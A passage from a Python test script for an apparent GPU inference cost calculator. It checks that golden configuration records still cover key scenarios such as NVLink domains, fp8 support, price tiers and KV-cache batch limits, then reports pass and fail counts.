    assert not unreachable, f"the golden records NVLink on a board without it: {unreachable}"

    def comp(cfg):
        return gr.compute(cfg)

    shapes = {
        "an OAM board with more than one device": lambda cs: any(
            c["gpu"].get("form") == "oam" and gr.device_count_for(c) > 1 for c in cs),
        "a price tier with no confirmed price": lambda cs: any(
            c["gpu"].get(t) is None for c in cs for t in ("hyper", "spec", "spot")),
        "a price recorded by hand": lambda cs: any(c["gpu"].get("priceRecord") for c in cs),
        "a card with constants": lambda cs: any(comp(c)["throughput_modelled"] for c in cs),
        "a card with none": lambda cs: any(not comp(c)["throughput_modelled"] for c in cs),
        "one board": lambda cs: any(c["n_gpu"] == 1 for c in cs),
        "past one NVLink domain": lambda cs: any(gr.device_count_for(c) > 8 for c in cs),
        "PCIe": lambda cs: any(not c.get("nvlink") for c in cs),
        "a model that does not fit": lambda cs: any(not comp(c)["fits"] for c in cs),
        "fp8 weights on silicon with the tensor cores":
            lambda cs: any(c.get("quant") == "fp8" and c["gpu"]["caps"]["fp8"] for c in cs),
        "fp8 weights on silicon without them":
            lambda cs: any(c.get("quant") == "fp8" and not c["gpu"]["caps"]["fp8"] for c in cs),
        "a batch the KV cache cannot hold":
            lambda cs: any(comp(c)["batch_limited"] for c in cs),
        "a model imported by id": lambda cs: any(c.get("hf_model") for c in cs),
    }
    gone = [name for name, hits in shapes.items() if not hits(cfgs)]
    assert not gone, "the golden no longer records: " + ", ".join(gone)


test("the golden records every catalog row, and the shapes that change what the report says",
     check_the_golden_records_the_shapes_that_matter)


test("the report still says exactly what the golden records",
     check_the_report_still_says_what_the_golden_records)


print(f"\n{pass_ct} passed, {fail_ct} failed\n")
sys.exit(1 if fail_ct else 0)
